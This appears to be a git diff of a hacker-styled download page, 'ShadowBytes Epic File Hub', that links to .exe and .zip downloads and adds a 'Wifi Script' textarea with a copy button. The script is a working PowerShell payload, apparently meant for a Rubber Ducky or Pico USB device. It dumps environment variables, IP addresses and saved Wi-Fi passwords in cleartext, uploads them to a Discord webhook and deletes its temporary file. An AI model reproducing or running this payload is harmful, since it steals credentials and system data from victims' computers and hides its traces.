@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>ShadowBytes Epic File Hub</title>
+  <link href="https://fonts.googleapis.com/css?family=Orbitron&display=swap" rel="stylesheet">
   <style>
     /* Basic reset */
     * {
@@ -13,11 +14,11 @@
     }
     html, body {
       height: 100%;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Orbitron', monospace;
       background: #111;
       overflow: hidden;
     }
-    /* Particles container */
+    /* Particle background */
     #particles-js {
       position: absolute;
       width: 100%;
@@ -25,39 +26,92 @@
       background: #111;
       z-index: 1;
     }
-    /* Centered content container */
+    /* Main container styling */
     .content {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      text-align: center;
-      color: #fff;
       z-index: 2;
-      padding: 20px;
-      background: rgba(0, 0, 0, 0.5);
+      width: 800px;
+      max-width: 90%;
+      padding: 40px;
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid #39FF14;
       border-radius: 10px;
+      text-align: center;
     }
     .content h1 {
-      margin-bottom: 20px;
-      font-size: 2em;
+      margin-bottom: 30px;
+      font-size: 2.5em;
+      color: #39FF14;
     }
-    .content a {
+    .buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+    .buttons a {
       text-decoration: none;
-      margin: 10px;
     }
-    .content button {
-      background: #ff6600;
-      border: none;
-      padding: 12px 24px;
-      font-size: 1em;
-      color: #fff;
+    .buttons button {
+      background: transparent;
+      border: 2px solid #39FF14;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      color: #39FF14;
       border-radius: 5px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: background 0.3s ease, transform 0.3s ease;
     }
-    .content button:hover {
-      background: #ff8533;
+    .buttons button:hover {
+      background: rgba(57, 255, 20, 0.2);
+      transform: scale(1.05);
+    }
+    /* Scripts Section */
+    .scripts {
+      text-align: left;
+    }
+    .scripts h2 {
+      margin-bottom: 20px;
+      font-size: 2em;
+      color: #39FF14;
+    }
+    .script {
+      margin-bottom: 20px;
+    }
+    .script h3 {
+      margin-bottom: 10px;
+      font-size: 1.5em;
+      color: #39FF14;
+    }
+    .script textarea {
+      width: 100%;
+      height: 150px;
+      background: #222;
+      color: #39FF14;
+      border: 1px solid #39FF14;
+      border-radius: 5px;
+      padding: 10px;
+      font-family: 'Orbitron', monospace;
+      resize: none;
+    }
+    .script button {
+      margin-top: 10px;
+      background: transparent;
+      border: 2px solid #39FF14;
+      padding: 10px 20px;
+      font-size: 1em;
+      color: #39FF14;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease;
+    }
+    .script button:hover {
+      background: rgba(57, 255, 20, 0.2);
+      transform: scale(1.05);
     }
   </style>
 </head>
@@ -68,15 +122,29 @@
   <!-- Main content -->
   <div class="content">
     <h1>Welcome to ShadowBytes Epic File Hub!</h1>
-    <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
-      <button>Charlottes App.exe</button>
-    </a>
-    <a href="https://bleh-xi.vercel.app/Silly.zip">
-      <button>Silly.zip</button>
-    </a>
-    <a href="https://bleh-xi.vercel.app/POWER.exe">
-      <button>POWER.exe</button>
-    </a>
+    <div class="buttons">
+      <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
+        <button>Charlottes App.exe</button>
+      </a>
+      <a href="https://bleh-xi.vercel.app/Silly.zip">
+        <button>Silly.zip</button>
+      </a>
+      <a href="https://bleh-xi.vercel.app/POWER.exe">
+        <button>POWER.exe</button>
+      </a>
+      <!-- More buttons can be added here -->
+    </div>
+
+    <!-- Scripts Section -->
+    <div class="scripts">
+      <h2>Scripts</h2>
+      <div class="script">
+        <h3>Wifi Script</h3>
+        <textarea id="wifiScript" readonly>$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit</textarea>
+        <button onclick="copyScript('wifiScript')">Copy Wifi Script</button>
+      </div>
+      <!-- More scripts sections can be added here -->
+    </div>
   </div>
 
   <!-- Particles.js library -->
@@ -187,6 +255,18 @@
       },
       "retina_detect": true
     });
+
+    // Function to copy script content to clipboard
+    function copyScript(id) {
+      const copyText = document.getElementById(id);
+      copyText.select();
+      copyText.setSelectionRange(0, 99999); // For mobile devices
+      navigator.clipboard.writeText(copyText.value).then(() => {
+        alert("Copied the script!");
+      }, (err) => {
+        alert("Failed to copy the script.");
+      });
+    }
   </script>
 </body>
 </html>
